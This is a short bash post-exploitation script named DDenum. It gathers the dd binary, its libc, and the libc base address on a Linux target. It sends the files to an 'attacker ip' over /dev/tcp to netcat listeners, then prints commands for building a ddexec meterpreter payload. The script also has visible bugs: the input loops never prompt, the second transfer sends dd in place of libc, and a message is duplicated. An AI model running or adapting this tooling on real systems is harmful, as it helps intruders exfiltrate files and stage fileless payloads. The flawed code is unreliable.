#! /bin/bash
echo "DDenum"
echo "Author : lLou_"
echo "---"

dd_bin=$(find / -executable -name dd 2>/dev/null | grep -v home | grep -v root | head -n1)
if [[ ! $dd_bin ]];then echo "[-] dd binary not found... cannot proceed";exit 1; fi
libc_bin=$(ldd $dd_bin | grep libc | cut -d' ' -f3)
if [[ ! $libc_bin ]];then echo "[-] libc binary not found... cannot proceed";exit 1; fi
libc_base=$(printf "0x";(linux64 -R setarch $ARCH -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep libc | head -n1 | cut -d'-' -f1)

echo -ne "[+] Binary informations fetched\ndd binary : $dd_bin\nlibc binary : $libc_bin\nlibc_base : $libc_base\n\n"

atk_ip=""
while [[ ! $atk_ip =~ "" ]]; do
   atk_ip=$(read -e -p " Attacker ip > " command)
done
echo "[?] execute 'nc -lp <port> > /tmp/dd' and give the port you used"
dd_port=""
while [[ ! $dd_port =~ "" ]]; do
   dd_port=$(read -e -p "[>] dd port download > " command)
done
cat $dd_bin >/dev/tcp/$atk_ip/$dd_port
echo "[?] execute 'nc -lp <port> > /tmp/libc.so.6' and give the port you used"
libc_port=""
while [[ ! $libc_port =~ "" ]]; do
   libc_port=$(read -e -p "[>] libc port download > " command)
done
cat $dd_bin >/dev/tcp/$atk_ip/$libc_port

echo ""
echo "[?] usefull binary transfered"
echo "[~] run localy 'ddexec -o ddexec_payload.sh -l /tmp/libc.so.6 -d /tmp/dd -b $libc_base -H $atk_ip -P 4444' to generate the ddexec payload for meterpreter"
echo "[~] run localy 'ddexec -o ddexec_payload.sh -l /tmp/libc.so.6 -d /tmp/dd -b $libc_base -H $atk_ip -P 4444' to generate the ddexec payload for other binary"
